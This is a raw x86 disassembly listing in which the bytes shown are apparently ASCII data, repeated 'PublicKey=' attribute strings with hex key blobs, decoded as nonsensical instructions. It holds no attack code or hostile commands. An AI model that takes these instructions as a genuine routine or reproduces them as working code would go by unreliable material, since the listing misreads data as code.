  406713:	and    BYTE PTR [eax+0x75],dl
  406716:	bound  ebp,QWORD PTR [ecx+ebp*2+0x63]
  40671a:	dec    ebx
  40671b:	gs jns 0x40675b
  40671e:	xor    BYTE PTR [eax],dh
  406720:	xor    dh,BYTE PTR [eax+esi*1]
  406723:	xor    BYTE PTR [eax],dh
  406725:	xor    BYTE PTR [eax],dh
  406727:	xor    al,0x38
  406729:	xor    BYTE PTR [eax],dh
  40672b:	xor    BYTE PTR [eax],dh
  40672d:	xor    BYTE PTR [ecx],bh
  40672f:	xor    al,0x30
  406731:	xor    BYTE PTR [eax],dh
  406733:	xor    BYTE PTR [eax],dh
  406735:	xor    BYTE PTR [eax],dh
  406737:	xor    BYTE PTR ss:[edx],dh
  40673a:	xor    BYTE PTR [eax],dh
  40673c:	xor    BYTE PTR [eax],dh
  40673e:	xor    BYTE PTR [eax],dh
  406740:	xor    dh,BYTE PTR [eax+esi*1]
  406743:	xor    BYTE PTR [eax],dh
  406745:	xor    BYTE PTR ds:0x34333532,dh
  40674b:	xor    DWORD PTR [ebx],esi
  40674d:	xor    DWORD PTR [eax],esi
  40674f:	xor    BYTE PTR [eax],dh
  406751:	xor    al,0x30
  406753:	xor    BYTE PTR [eax],dh
  406755:	xor    BYTE PTR [eax],dh
  406757:	xor    DWORD PTR [eax],esi
  406759:	xor    BYTE PTR [eax],dh
  40675b:	xor    DWORD PTR [eax],esi
  40675d:	xor    BYTE PTR [eax],dh
  40675f:	aaa    
  406760:	xor    DWORD PTR fs:[esi+0x61],esp
  406764:	xor    eax,0x61346337
  406769:	gs cmp DWORD PTR fs:[esi+0x30],esp
  40676e:	popa   
  40676f:	xor    esi,DWORD PTR [edx]
  406771:	cmp    BYTE PTR gs:[ecx+eiz*2],dh
  406775:	popa   
  406776:	xor    BYTE PTR [esi+0x61],ah
  406779:	gs data16 xor BYTE PTR fs:[ebp+eiz*2+0x39],ah
  406780:	cmp    BYTE PTR gs:[esi+0x64],ah
  406784:	ss popa 
  406786:	arpl   WORD PTR gs:[eax],di
  406789:	data16 cmp BYTE PTR [edi],dh
  40678c:	bound  si,DWORD PTR [eax]
  40678f:	xor    esi,DWORD PTR [edi]
  406791:	ss arpl WORD PTR ss:[eax],di
  406795:	xor    esi,DWORD PTR [ebx+eiz*2]
  406798:	cmp    DWORD PTR [ecx],edi
  40679a:	cmp    DWORD PTR [edx],esi
  40679c:	xor    DWORD PTR [ebp+0x62],esp
  40679f:	xor    dh,BYTE PTR [ebx]
  4067a1:	bound  esp,QWORD PTR [ebp+0x37]
  4067a4:	cmp    DWORD PTR [ecx+0x64],esp
  4067a7:	cmp    DWORD PTR [ebp+esi*1+0x64],esp
  4067ab:	arpl   WORD PTR [ebx+0x31],sp
  4067ae:	fs cmp DWORD PTR fs:[ecx+0x64],esp
  4067b3:	xor    dh,BYTE PTR [ebx]
  4067b5:	xor    DWORD PTR ss:[ebx],esi
  4067b8:	xor    dh,BYTE PTR [ecx]
  4067ba:	xor    BYTE PTR [edx],dh
  4067bc:	cmp    DWORD PTR [eax],esi
  4067be:	xor    BYTE PTR [edx+0x37],ah
  4067c1:	xor    dh,BYTE PTR [ebx]
  4067c3:	arpl   WORD PTR [esi+0x39],sp
  4067c6:	cmp    BYTE PTR [eax],dh
  4067c8:	cmp    DWORD PTR ds:0x34636637,esi
  4067ce:	xor    DWORD PTR gs:[edi],esi
  4067d1:	aaa    
  4067d2:	xor    DWORD PTR [eax],esi
  4067d4:	cmp    BYTE PTR [esi+0x63],ah
  4067d7:	xor    BYTE PTR ss:[edi],dh
  4067da:	aaa    
  4067db:	aaa    
  4067dc:	xor    al,0x66
  4067de:	xor    bh,BYTE PTR [ecx]
  4067e0:	cmp    BYTE PTR gs:[ebx],dh
  4067e3:	xor    dh,BYTE PTR [eax]
  4067e5:	cmp    DWORD PTR gs:[edx],esi
  4067e8:	gs popa 
  4067ea:	xor    BYTE PTR ds:0x34656365,dh
  4067f0:	cmp    BYTE PTR gs:[edx],dh
  4067f3:	xor    DWORD PTR [ebx+0x30],esp
  4067f6:	popa   
  4067f7:	xor    eax,0x38656665
  4067fc:	xor    WORD PTR [esi],si
  4067ff:	xor    al,0x35
  406801:	arpl   WORD PTR [ebx+eiz*2],si
  406804:	xor    BYTE PTR [ebx+0x39],ah
  406807:	xor    esp,DWORD PTR [ebx+0x31]
  40680a:	popa   
  40680b:	bound  edi,QWORD PTR [ecx]
  40680d:	cmp    DWORD PTR [edx],esi
  40680f:	cmp    BYTE PTR ds:0x32323664,dh
  406815:	arpl   WORD PTR [ecx+0x61],sp
  406818:	ss xor eax,0x64316332
  40681e:	popaw  
  406820:	fs xor esp,DWORD PTR ss:[edi+esi*1+0x34]
  406826:	xor    eax,0x32663664
  40682b:	fs gs xor eax,0x65373166
  406832:	xor    eax,0x30666165
  406837:	data16 arpl WORD PTR [ecx+edi*1],si
  40683b:	xor    esp,DWORD PTR ss:[edx+esi*1+0x36]
  406840:	xor    DWORD PTR [ebx+0x38],esp
  406843:	popa   
  406844:	xor    DWORD PTR [edx],esi
  406846:	xor    al,0x33
  406848:	ss xor eax,0x30323831
  40684e:	ss arpl WORD PTR fs:[eax],si
  406852:	cmp    DWORD PTR [ebx],esi
  406854:	xor    esi,DWORD PTR [esp+esi*1]
  406857:	fs xor eax,0x39326461
  40685d:	xor    eax,DWORD PTR [eax]
  40685f:	add    BYTE PTR [ecx-0x7efffe7f],al
  406865:	jnp    0x4068d7
  406867:	jb     0x4068d8
  406869:	je     0x4068d0
  40686b:	jne    0x4068e0
  40686d:	pop    edi
  40686e:	jo     0x4068d5
  406870:	jb     0x4068d8
  406872:	pop    edi
  406873:	je     0x4068da
  406875:	jae    0x4068eb
  406877:	pop    edi
  406878:	imul   ebp,DWORD PTR [esi+0x74],0x61726765
  40687f:	je     0x4068ea
  406881:	outs   dx,DWORD PTR ds:[esi]
  406882:	outs   dx,BYTE PTR ds:[esi]
  406883:	pop    edi
  406884:	arpl   WORD PTR [edi+0x6c],bp
  406887:	ins    BYTE PTR es:[edi],dx
  406888:	arpl   WORD PTR gs:[edi+ebp*2+0x72],si
  40688d:	pop    edi
  40688e:	ins    BYTE PTR es:[edi],dx
  40688f:	popa   
  406890:	je     0x4068f7
  406892:	outs   dx,BYTE PTR ds:[esi]
  406893:	arpl   WORD PTR [ecx+0x2c],di
  406896:	and    BYTE PTR [eax+0x75],dl
  406899:	bound  ebp,QWORD PTR [ecx+ebp*2+0x63]
  40689d:	dec    ebx
  40689e:	gs jns 0x4068de
  4068a1:	xor    BYTE PTR [eax],dh
  4068a3:	xor    dh,BYTE PTR [eax+esi*1]
  4068a6:	xor    BYTE PTR [eax],dh
  4068a8:	xor    BYTE PTR [eax],dh
  4068aa:	xor    al,0x38
  4068ac:	xor    BYTE PTR [eax],dh
  4068ae:	xor    BYTE PTR [eax],dh
  4068b0:	xor    BYTE PTR [ecx],bh
  4068b2:	xor    al,0x30
  4068b4:	xor    BYTE PTR [eax],dh
  4068b6:	xor    BYTE PTR [eax],dh
  4068b8:	xor    BYTE PTR [eax],dh
  4068ba:	xor    BYTE PTR ss:[edx],dh
  4068bd:	xor    BYTE PTR [eax],dh
  4068bf:	xor    BYTE PTR [eax],dh
  4068c1:	xor    BYTE PTR [eax],dh
  4068c3:	xor    dh,BYTE PTR [eax+esi*1]
  4068c6:	xor    BYTE PTR [eax],dh
  4068c8:	xor    BYTE PTR ds:0x34333532,dh
  4068ce:	xor    DWORD PTR [ebx],esi
  4068d0:	xor    DWORD PTR [eax],esi
  4068d2:	xor    BYTE PTR [eax],dh
  4068d4:	xor    al,0x30
  4068d6:	xor    BYTE PTR [eax],dh
  4068d8:	xor    BYTE PTR [eax],dh
  4068da:	xor    DWORD PTR [eax],esi
  4068dc:	xor    BYTE PTR [eax],dh
  4068de:	xor    DWORD PTR [eax],esi
  4068e0:	xor    BYTE PTR [eax],dh
  4068e2:	aaa    
  4068e3:	xor    DWORD PTR fs:[esi+0x61],esp
  4068e7:	xor    eax,0x61346337
  4068ec:	gs cmp DWORD PTR fs:[esi+0x30],esp
  4068f1:	popa   
  4068f2:	xor    esi,DWORD PTR [edx]
  4068f4:	cmp    BYTE PTR gs:[ecx+eiz*2],dh
  4068f8:	popa   
  4068f9:	xor    BYTE PTR [esi+0x61],ah
  4068fc:	gs data16 xor BYTE PTR fs:[ebp+eiz*2+0x39],ah
  406903:	cmp    BYTE PTR gs:[esi+0x64],ah
  406907:	ss popa 
  406909:	arpl   WORD PTR gs:[eax],di
  40690c:	data16 cmp BYTE PTR [edi],dh
  40690f:	bound  si,DWORD PTR [eax]
  406912:	xor    esi,DWORD PTR [edi]
  406914:	ss arpl WORD PTR ss:[eax],di
  406918:	xor    esi,DWORD PTR [ebx+eiz*2]
  40691b:	cmp    DWORD PTR [ecx],edi
  40691d:	cmp    DWORD PTR [edx],esi
  40691f:	xor    DWORD PTR [ebp+0x62],esp
  406922:	xor    dh,BYTE PTR [ebx]
  406924:	bound  esp,QWORD PTR [ebp+0x37]
  406927:	cmp    DWORD PTR [ecx+0x64],esp
  40692a:	cmp    DWORD PTR [ebp+esi*1+0x64],esp
  40692e:	arpl   WORD PTR [ebx+0x31],sp
  406931:	fs cmp DWORD PTR fs:[ecx+0x64],esp
  406936:	xor    dh,BYTE PTR [ebx]
  406938:	xor    DWORD PTR ss:[ebx],esi
  40693b:	xor    dh,BYTE PTR [ecx]
  40693d:	xor    BYTE PTR [edx],dh
  40693f:	cmp    DWORD PTR [eax],esi
  406941:	xor    BYTE PTR [edx+0x37],ah
  406944:	xor    dh,BYTE PTR [ebx]
  406946:	arpl   WORD PTR [esi+0x39],sp
  406949:	cmp    BYTE PTR [eax],dh
  40694b:	cmp    DWORD PTR ds:0x34636637,esi
  406951:	xor    DWORD PTR gs:[edi],esi
  406954:	aaa    
  406955:	xor    DWORD PTR [eax],esi
  406957:	cmp    BYTE PTR [esi+0x63],ah
  40695a:	xor    BYTE PTR ss:[edi],dh
  40695d:	aaa    
  40695e:	aaa    
  40695f:	xor    al,0x66
  406961:	xor    bh,BYTE PTR [ecx]
  406963:	cmp    BYTE PTR gs:[ebx],dh
  406966:	xor    dh,BYTE PTR [eax]
  406968:	cmp    DWORD PTR gs:[edx],esi
  40696b:	gs popa 
  40696d:	xor    BYTE PTR ds:0x34656365,dh
  406973:	cmp    BYTE PTR gs:[edx],dh
  406976:	xor    DWORD PTR [ebx+0x30],esp
  406979:	popa   
  40697a:	xor    eax,0x38656665
  40697f:	xor    WORD PTR [esi],si
  406982:	xor    al,0x35
  406984:	arpl   WORD PTR [ebx+eiz*2],si
  406987:	xor    BYTE PTR [ebx+0x39],ah
  40698a:	xor    esp,DWORD PTR [ebx+0x31]
  40698d:	popa   
  40698e:	bound  edi,QWORD PTR [ecx]
  406990:	cmp    DWORD PTR [edx],esi
  406992:	cmp    BYTE PTR ds:0x32323664,dh
  406998:	arpl   WORD PTR [ecx+0x61],sp
  40699b:	ss xor eax,0x64316332
  4069a1:	popaw  
  4069a3:	fs xor esp,DWORD PTR ss:[edi+esi*1+0x34]
  4069a9:	xor    eax,0x32663664
  4069ae:	fs gs xor eax,0x65373166
  4069b5:	xor    eax,0x30666165
  4069ba:	data16 arpl WORD PTR [ecx+edi*1],si
  4069be:	xor    esp,DWORD PTR ss:[edx+esi*1+0x36]
  4069c3:	xor    DWORD PTR [ebx+0x38],esp
  4069c6:	popa   
  4069c7:	xor    DWORD PTR [edx],esi
  4069c9:	xor    al,0x33
  4069cb:	ss xor eax,0x30323831
  4069d1:	ss arpl WORD PTR fs:[eax],si
  4069d5:	cmp    DWORD PTR [ebx],esi
  4069d7:	xor    esi,DWORD PTR [esp+esi*1]
  4069da:	fs xor eax,0x39326461
  4069e0:	xor    eax,DWORD PTR [eax]
  4069e2:	add    BYTE PTR [ecx-0x7efffe84],al
  4069e8:	jbe    0x406a5a
  4069ea:	jb     0x406a5b
  4069ec:	je     0x406a53
  4069ee:	jne    0x406a63
  4069f0:	pop    edi
  4069f1:	jo     0x406a58
  4069f3:	jb     0x406a5b
  4069f5:	pop    edi
  4069f6:	je     0x406a5d
  4069f8:	jae    0x406a6e
  4069fa:	pop    edi
  4069fb:	imul   ebp,DWORD PTR [esi+0x74],0x61726765
  406a02:	je     0x406a6d
  406a04:	outs   dx,DWORD PTR ds:[esi]
  406a05:	outs   dx,BYTE PTR ds:[esi]
  406a06:	pop    edi
  406a07:	ins    BYTE PTR es:[edi],dx
  406a08:	outs   dx,DWORD PTR ds:[esi]
  406a09:	popa   
  406a0a:	fs ins BYTE PTR es:[edi],dx
  406a0c:	outs   dx,DWORD PTR ds:[esi]
  406a0d:	addr16 pop edi
  406a0f:	push   0x2c686769
  406a14:	and    BYTE PTR [eax+0x75],dl
  406a17:	bound  ebp,QWORD PTR [ecx+ebp*2+0x63]
  406a1b:	dec    ebx
  406a1c:	gs jns 0x406a5c
  406a1f:	xor    BYTE PTR [eax],dh
  406a21:	xor    dh,BYTE PTR [eax+esi*1]
  406a24:	xor    BYTE PTR [eax],dh
  406a26:	xor    BYTE PTR [eax],dh
  406a28:	xor    al,0x38
  406a2a:	xor    BYTE PTR [eax],dh
  406a2c:	xor    BYTE PTR [eax],dh
  406a2e:	xor    BYTE PTR [ecx],bh
  406a30:	xor    al,0x30
  406a32:	xor    BYTE PTR [eax],dh
  406a34:	xor    BYTE PTR [eax],dh
  406a36:	xor    BYTE PTR [eax],dh
  406a38:	xor    BYTE PTR ss:[edx],dh
  406a3b:	xor    BYTE PTR [eax],dh
  406a3d:	xor    BYTE PTR [eax],dh
  406a3f:	xor    BYTE PTR [eax],dh
  406a41:	xor    dh,BYTE PTR [eax+esi*1]
  406a44:	xor    BYTE PTR [eax],dh
  406a46:	xor    BYTE PTR ds:0x34333532,dh
  406a4c:	xor    DWORD PTR [ebx],esi
  406a4e:	xor    DWORD PTR [eax],esi
  406a50:	xor    BYTE PTR [eax],dh
  406a52:	xor    al,0x30
  406a54:	xor    BYTE PTR [eax],dh
  406a56:	xor    BYTE PTR [eax],dh
  406a58:	xor    DWORD PTR [eax],esi
  406a5a:	xor    BYTE PTR [eax],dh
  406a5c:	xor    DWORD PTR [eax],esi
  406a5e:	xor    BYTE PTR [eax],dh
  406a60:	aaa    
  406a61:	xor    DWORD PTR fs:[esi+0x61],esp
  406a65:	xor    eax,0x61346337
  406a6a:	gs cmp DWORD PTR fs:[esi+0x30],esp
  406a6f:	popa   
  406a70:	xor    esi,DWORD PTR [edx]
  406a72:	cmp    BYTE PTR gs:[ecx+eiz*2],dh
  406a76:	popa   
  406a77:	xor    BYTE PTR [esi+0x61],ah
  406a7a:	gs data16 xor BYTE PTR fs:[ebp+eiz*2+0x39],ah
  406a81:	cmp    BYTE PTR gs:[esi+0x64],ah
  406a85:	ss popa 
  406a87:	arpl   WORD PTR gs:[eax],di
  406a8a:	data16 cmp BYTE PTR [edi],dh
  406a8d:	bound  si,DWORD PTR [eax]
  406a90:	xor    esi,DWORD PTR [edi]
  406a92:	ss arpl WORD PTR ss:[eax],di
  406a96:	xor    esi,DWORD PTR [ebx+eiz*2]
  406a99:	cmp    DWORD PTR [ecx],edi
  406a9b:	cmp    DWORD PTR [edx],esi
  406a9d:	xor    DWORD PTR [ebp+0x62],esp
  406aa0:	xor    dh,BYTE PTR [ebx]
  406aa2:	bound  esp,QWORD PTR [ebp+0x37]
  406aa5:	cmp    DWORD PTR [ecx+0x64],esp
  406aa8:	cmp    DWORD PTR [ebp+esi*1+0x64],esp
  406aac:	arpl   WORD PTR [ebx+0x31],sp
  406aaf:	fs cmp DWORD PTR fs:[ecx+0x64],esp
  406ab4:	xor    dh,BYTE PTR [ebx]
  406ab6:	xor    DWORD PTR ss:[ebx],esi
  406ab9:	xor    dh,BYTE PTR [ecx]
  406abb:	xor    BYTE PTR [edx],dh
  406abd:	cmp    DWORD PTR [eax],esi
  406abf:	xor    BYTE PTR [edx+0x37],ah
  406ac2:	xor    dh,BYTE PTR [ebx]
  406ac4:	arpl   WORD PTR [esi+0x39],sp
  406ac7:	cmp    BYTE PTR [eax],dh
  406ac9:	cmp    DWORD PTR ds:0x34636637,esi
  406acf:	xor    DWORD PTR gs:[edi],esi
  406ad2:	aaa    
  406ad3:	xor    DWORD PTR [eax],esi
  406ad5:	cmp    BYTE PTR [esi+0x63],ah
  406ad8:	xor    BYTE PTR ss:[edi],dh
  406adb:	aaa    
  406adc:	aaa    
  406add:	xor    al,0x66
  406adf:	xor    bh,BYTE PTR [ecx]
  406ae1:	cmp    BYTE PTR gs:[ebx],dh
  406ae4:	xor    dh,BYTE PTR [eax]
  406ae6:	cmp    DWORD PTR gs:[edx],esi
  406ae9:	gs popa 
  406aeb:	xor    BYTE PTR ds:0x34656365,dh
  406af1:	cmp    BYTE PTR gs:[edx],dh
  406af4:	xor    DWORD PTR [ebx+0x30],esp
  406af7:	popa   
  406af8:	xor    eax,0x38656665
  406afd:	xor    WORD PTR [esi],si
  406b00:	xor    al,0x35
  406b02:	arpl   WORD PTR [ebx+eiz*2],si
  406b05:	xor    BYTE PTR [ebx+0x39],ah
  406b08:	xor    esp,DWORD PTR [ebx+0x31]
  406b0b:	popa   
  406b0c:	bound  edi,QWORD PTR [ecx]
  406b0e:	cmp    DWORD PTR [edx],esi
  406b10:	cmp    BYTE PTR ds:0x32323664,dh
  406b16:	arpl   WORD PTR [ecx+0x61],sp
  406b19:	ss xor eax,0x64316332
  406b1f:	popaw  
  406b21:	fs xor esp,DWORD PTR ss:[edi+esi*1+0x34]
  406b27:	xor    eax,0x32663664
  406b2c:	fs gs xor eax,0x65373166
  406b33:	xor    eax,0x30666165
  406b38:	data16 arpl WORD PTR [ecx+edi*1],si
  406b3c:	xor    esp,DWORD PTR ss:[edx+esi*1+0x36]
  406b41:	xor    DWORD PTR [ebx+0x38],esp
  406b44:	popa   
  406b45:	xor    DWORD PTR [edx],esi
  406b47:	xor    al,0x33
  406b49:	ss xor eax,0x30323831
  406b4f:	ss arpl WORD PTR fs:[eax],si
  406b53:	cmp    DWORD PTR [ebx],esi
  406b55:	xor    esi,DWORD PTR [esp+esi*1]
  406b58:	fs xor eax,0x39326461
  406b5e:	xor    eax,DWORD PTR [eax]
  406b60:	add    BYTE PTR [ecx-0x7efffea8],al
  406b66:	push   edx
  406b67:	dec    esi
  406b68:	push   eax
  406b69:	inc    edx
  406b6a:	imul   ebp,DWORD PTR [esi+0x64],0x7550202c
  406b71:	bound  ebp,QWORD PTR [ecx+ebp*2+0x63]
  406b75:	dec    ebx
  406b76:	gs jns 0x406bb6
  406b79:	xor    BYTE PTR [eax],dh
  406b7b:	xor    dh,BYTE PTR [eax+esi*1]
  406b7e:	xor    BYTE PTR [eax],dh
  406b80:	xor    BYTE PTR [eax],dh
  406b82:	xor    al,0x38
  406b84:	xor    BYTE PTR [eax],dh
  406b86:	xor    BYTE PTR [eax],dh
  406b88:	xor    BYTE PTR [ecx],bh
  406b8a:	xor    al,0x30
  406b8c:	xor    BYTE PTR [eax],dh
  406b8e:	xor    BYTE PTR [eax],dh
  406b90:	xor    BYTE PTR [eax],dh
  406b92:	xor    BYTE PTR ss:[edx],dh
  406b95:	xor    BYTE PTR [eax],dh
  406b97:	xor    BYTE PTR [eax],dh
  406b99:	xor    BYTE PTR [eax],dh
  406b9b:	xor    dh,BYTE PTR [eax+esi*1]
  406b9e:	xor    BYTE PTR [eax],dh
  406ba0:	xor    BYTE PTR ds:0x34333532,dh
  406ba6:	xor    DWORD PTR [ebx],esi
  406ba8:	xor    DWORD PTR [eax],esi
  406baa:	xor    BYTE PTR [eax],dh
  406bac:	xor    al,0x30
  406bae:	xor    BYTE PTR [eax],dh
  406bb0:	xor    BYTE PTR [eax],dh
  406bb2:	xor    DWORD PTR [eax],esi
  406bb4:	xor    BYTE PTR [eax],dh
  406bb6:	xor    DWORD PTR [eax],esi
  406bb8:	xor    BYTE PTR [eax],dh
  406bba:	aaa    
  406bbb:	xor    DWORD PTR fs:[esi+0x61],esp
  406bbf:	xor    eax,0x61346337
  406bc4:	gs cmp DWORD PTR fs:[esi+0x30],esp
  406bc9:	popa   
  406bca:	xor    esi,DWORD PTR [edx]
  406bcc:	cmp    BYTE PTR gs:[ecx+eiz*2],dh
  406bd0:	popa   
  406bd1:	xor    BYTE PTR [esi+0x61],ah
  406bd4:	gs data16 xor BYTE PTR fs:[ebp+eiz*2+0x39],ah
  406bdb:	cmp    BYTE PTR gs:[esi+0x64],ah
  406bdf:	ss popa 
  406be1:	arpl   WORD PTR gs:[eax],di
  406be4:	data16 cmp BYTE PTR [edi],dh
  406be7:	bound  si,DWORD PTR [eax]
  406bea:	xor    esi,DWORD PTR [edi]
  406bec:	ss arpl WORD PTR ss:[eax],di
  406bf0:	xor    esi,DWORD PTR [ebx+eiz*2]
  406bf3:	cmp    DWORD PTR [ecx],edi
  406bf5:	cmp    DWORD PTR [edx],esi
  406bf7:	xor    DWORD PTR [ebp+0x62],esp
  406bfa:	xor    dh,BYTE PTR [ebx]
  406bfc:	bound  esp,QWORD PTR [ebp+0x37]
  406bff:	cmp    DWORD PTR [ecx+0x64],esp
  406c02:	cmp    DWORD PTR [ebp+esi*1+0x64],esp
  406c06:	arpl   WORD PTR [ebx+0x31],sp
  406c09:	fs cmp DWORD PTR fs:[ecx+0x64],esp
  406c0e:	xor    dh,BYTE PTR [ebx]
  406c10:	xor    DWORD PTR ss:[ebx],esi
  406c13:	xor    dh,BYTE PTR [ecx]
  406c15:	xor    BYTE PTR [edx],dh
  406c17:	cmp    DWORD PTR [eax],esi
  406c19:	xor    BYTE PTR [edx+0x37],ah
  406c1c:	xor    dh,BYTE PTR [ebx]
  406c1e:	arpl   WORD PTR [esi+0x39],sp
  406c21:	cmp    BYTE PTR [eax],dh
  406c23:	cmp    DWORD PTR ds:0x34636637,esi
  406c29:	xor    DWORD PTR gs:[edi],esi
  406c2c:	aaa    
  406c2d:	xor    DWORD PTR [eax],esi
  406c2f:	cmp    BYTE PTR [esi+0x63],ah
  406c32:	xor    BYTE PTR ss:[edi],dh
  406c35:	aaa    
  406c36:	aaa    
  406c37:	xor    al,0x66
  406c39:	xor    bh,BYTE PTR [ecx]
  406c3b:	cmp    BYTE PTR gs:[ebx],dh
  406c3e:	xor    dh,BYTE PTR [eax]
  406c40:	cmp    DWORD PTR gs:[edx],esi
  406c43:	gs popa 
  406c45:	xor    BYTE PTR ds:0x34656365,dh
  406c4b:	cmp    BYTE PTR gs:[edx],dh
  406c4e:	xor    DWORD PTR [ebx+0x30],esp
  406c51:	popa   
  406c52:	xor    eax,0x38656665
  406c57:	xor    WORD PTR [esi],si
  406c5a:	xor    al,0x35
  406c5c:	arpl   WORD PTR [ebx+eiz*2],si
  406c5f:	xor    BYTE PTR [ebx+0x39],ah
  406c62:	xor    esp,DWORD PTR [ebx+0x31]
  406c65:	popa   
  406c66:	bound  edi,QWORD PTR [ecx]
  406c68:	cmp    DWORD PTR [edx],esi
  406c6a:	cmp    BYTE PTR ds:0x32323664,dh
  406c70:	arpl   WORD PTR [ecx+0x61],sp
  406c73:	ss xor eax,0x64316332
  406c79:	popaw  
  406c7b:	fs xor esp,DWORD PTR ss:[edi+esi*1+0x34]
  406c81:	xor    eax,0x32663664
  406c86:	fs gs xor eax,0x65373166
  406c8d:	xor    eax,0x30666165
  406c92:	data16 arpl WORD PTR [ecx+edi*1],si
  406c96:	xor    esp,DWORD PTR ss:[edx+esi*1+0x36]
  406c9b:	xor    DWORD PTR [ebx+0x38],esp
  406c9e:	popa   
  406c9f:	xor    DWORD PTR [edx],esi
  406ca1:	xor    al,0x33
  406ca3:	ss xor eax,0x30323831
  406ca9:	ss arpl WORD PTR fs:[eax],si
  406cad:	cmp    DWORD PTR [ebx],esi
  406caf:	xor    esi,DWORD PTR [esp+esi*1]
  406cb2:	fs xor eax,0x39326461
  406cb8:	xor    eax,DWORD PTR [eax]
  406cba:	add    BYTE PTR [ecx-0x7efffea3],al
  406cc0:	push   edi
  406cc1:	inc    ebx
  406cc2:	push   eax
  406cc3:	push   esi
  406cc4:	popa   
  406cc5:	ins    BYTE PTR es:[edi],dx
  406cc6:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x202c726f
  406cce:	push   eax
  406ccf:	jne    0x406d33
  406cd1:	ins    BYTE PTR es:[edi],dx
  406cd2:	imul   esp,DWORD PTR [ebx+0x4b],0x303d7965
  406cd9:	xor    BYTE PTR [edx],dh
  406cdb:	xor    al,0x30
  406cdd:	xor    BYTE PTR [eax],dh
  406cdf:	xor    BYTE PTR [eax],dh
  406ce1:	xor    al,0x38
  406ce3:	xor    BYTE PTR [eax],dh
  406ce5:	xor    BYTE PTR [eax],dh
  406ce7:	xor    BYTE PTR [ecx],bh
  406ce9:	xor    al,0x30
  406ceb:	xor    BYTE PTR [eax],dh
  406ced:	xor    BYTE PTR [eax],dh
  406cef:	xor    BYTE PTR [eax],dh
  406cf1:	xor    BYTE PTR ss:[edx],dh
  406cf4:	xor    BYTE PTR [eax],dh
  406cf6:	xor    BYTE PTR [eax],dh
  406cf8:	xor    BYTE PTR [eax],dh
  406cfa:	xor    dh,BYTE PTR [eax+esi*1]
  406cfd:	xor    BYTE PTR [eax],dh
  406cff:	xor    BYTE PTR ds:0x34333532,dh
  406d05:	xor    DWORD PTR [ebx],esi
  406d07:	xor    DWORD PTR [eax],esi
  406d09:	xor    BYTE PTR [eax],dh
  406d0b:	xor    al,0x30
  406d0d:	xor    BYTE PTR [eax],dh
  406d0f:	xor    BYTE PTR [eax],dh
  406d11:	xor    DWORD PTR [eax],esi
  406d13:	xor    BYTE PTR [eax],dh
  406d15:	xor    DWORD PTR [eax],esi
  406d17:	xor    BYTE PTR [eax],dh
  406d19:	aaa    
  406d1a:	xor    DWORD PTR fs:[esi+0x61],esp
  406d1e:	xor    eax,0x61346337
  406d23:	gs cmp DWORD PTR fs:[esi+0x30],esp
  406d28:	popa   
  406d29:	xor    esi,DWORD PTR [edx]
  406d2b:	cmp    BYTE PTR gs:[ecx+eiz*2],dh
  406d2f:	popa   
  406d30:	xor    BYTE PTR [esi+0x61],ah
  406d33:	gs data16 xor BYTE PTR fs:[ebp+eiz*2+0x39],ah
  406d3a:	cmp    BYTE PTR gs:[esi+0x64],ah
  406d3e:	ss popa 
  406d40:	arpl   WORD PTR gs:[eax],di
  406d43:	data16 cmp BYTE PTR [edi],dh
  406d46:	bound  si,DWORD PTR [eax]
  406d49:	xor    esi,DWORD PTR [edi]
  406d4b:	ss arpl WORD PTR ss:[eax],di
  406d4f:	xor    esi,DWORD PTR [ebx+eiz*2]
  406d52:	cmp    DWORD PTR [ecx],edi
  406d54:	cmp    DWORD PTR [edx],esi
  406d56:	xor    DWORD PTR [ebp+0x62],esp
  406d59:	xor    dh,BYTE PTR [ebx]
  406d5b:	bound  esp,QWORD PTR [ebp+0x37]
  406d5e:	cmp    DWORD PTR [ecx+0x64],esp
  406d61:	cmp    DWORD PTR [ebp+esi*1+0x64],esp
  406d65:	arpl   WORD PTR [ebx+0x31],sp
  406d68:	fs cmp DWORD PTR fs:[ecx+0x64],esp
  406d6d:	xor    dh,BYTE PTR [ebx]
  406d6f:	xor    DWORD PTR ss:[ebx],esi
  406d72:	xor    dh,BYTE PTR [ecx]
  406d74:	xor    BYTE PTR [edx],dh
  406d76:	cmp    DWORD PTR [eax],esi
  406d78:	xor    BYTE PTR [edx+0x37],ah
  406d7b:	xor    dh,BYTE PTR [ebx]
  406d7d:	arpl   WORD PTR [esi+0x39],sp
  406d80:	cmp    BYTE PTR [eax],dh
  406d82:	cmp    DWORD PTR ds:0x34636637,esi
  406d88:	xor    DWORD PTR gs:[edi],esi
  406d8b:	aaa    
  406d8c:	xor    DWORD PTR [eax],esi
  406d8e:	cmp    BYTE PTR [esi+0x63],ah
  406d91:	xor    BYTE PTR ss:[edi],dh
  406d94:	aaa    
  406d95:	aaa    
  406d96:	xor    al,0x66
  406d98:	xor    bh,BYTE PTR [ecx]
  406d9a:	cmp    BYTE PTR gs:[ebx],dh
  406d9d:	xor    dh,BYTE PTR [eax]
  406d9f:	cmp    DWORD PTR gs:[edx],esi
  406da2:	gs popa 
  406da4:	xor    BYTE PTR ds:0x34656365,dh
  406daa:	cmp    BYTE PTR gs:[edx],dh
  406dad:	xor    DWORD PTR [ebx+0x30],esp
  406db0:	popa   
  406db1:	xor    eax,0x38656665
  406db6:	xor    WORD PTR [esi],si
  406db9:	xor    al,0x35
  406dbb:	arpl   WORD PTR [ebx+eiz*2],si
  406dbe:	xor    BYTE PTR [ebx+0x39],ah
  406dc1:	xor    esp,DWORD PTR [ebx+0x31]
  406dc4:	popa   
  406dc5:	bound  edi,QWORD PTR [ecx]
  406dc7:	cmp    DWORD PTR [edx],esi
  406dc9:	cmp    BYTE PTR ds:0x32323664,dh
  406dcf:	arpl   WORD PTR [ecx+0x61],sp
  406dd2:	ss xor eax,0x64316332
  406dd8:	popaw  
  406dda:	fs xor esp,DWORD PTR ss:[edi+esi*1+0x34]
  406de0:	xor    eax,0x32663664
  406de5:	fs gs xor eax,0x65373166
  406dec:	xor    eax,0x30666165
  406df1:	data16 arpl WORD PTR [ecx+edi*1],si
  406df5:	xor    esp,DWORD PTR ss:[edx+esi*1+0x36]
  406dfa:	xor    DWORD PTR [ebx+0x38],esp
  406dfd:	popa   
  406dfe:	xor    DWORD PTR [edx],esi
  406e00:	xor    al,0x33
  406e02:	ss xor eax,0x30323831
  406e08:	ss arpl WORD PTR fs:[eax],si
  406e0c:	cmp    DWORD PTR [ebx],esi
  406e0e:	xor    esi,DWORD PTR [esp+esi*1]
  406e11:	fs xor eax,0x39326461
  406e17:	xor    eax,DWORD PTR [eax]
